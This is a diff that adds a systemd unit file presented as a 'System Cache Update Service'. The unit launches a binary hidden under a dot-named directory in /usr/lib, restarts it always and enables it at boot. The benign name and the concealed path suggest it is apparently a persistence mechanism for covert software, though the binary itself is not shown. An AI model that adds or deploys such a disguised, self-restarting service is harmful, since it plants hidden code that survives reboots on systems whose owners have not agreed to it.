@@ -1,0 +1,10 @@
+[Unit]
+Description=System Cache Update Service
+
+[Service]
+Type=simple
+ExecStart=/usr/lib/.system-cache/.sysupd
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
